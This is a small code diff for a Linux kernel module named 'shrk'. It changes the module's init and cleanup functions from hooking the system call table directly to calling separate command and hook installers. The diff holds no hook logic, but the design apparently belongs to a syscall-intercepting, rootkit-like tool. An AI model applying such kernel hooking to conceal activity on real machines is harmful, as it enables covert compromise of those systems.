@@ -1,7 +1,5 @@
-#include "inc/systable.h"
-#include "inc/util.h"
-
-#include <linux/module.h>
+#include "inc/cmds.h"
+#include "inc/hook.h"
 
 // clang-format off
 
@@ -38,13 +36,20 @@ module_init(init);
 module_exit(cleanup);
 
 int init() {
-  debg("loaded the shrk module");
-  if (!systable_hook())
+  if (!cmds_install()) {
+    cleanup();
     return -1;
+  }
+
+  if (!hooks_install()) {
+    cleanup();
+    return -1;
+  }
+
   return 0;
 }
 
 void cleanup() {
-  debg("unloaded the shrk module");
-  systable_unhook();
+  hooks_uninstall();
+  cmds_uninstall();
 }
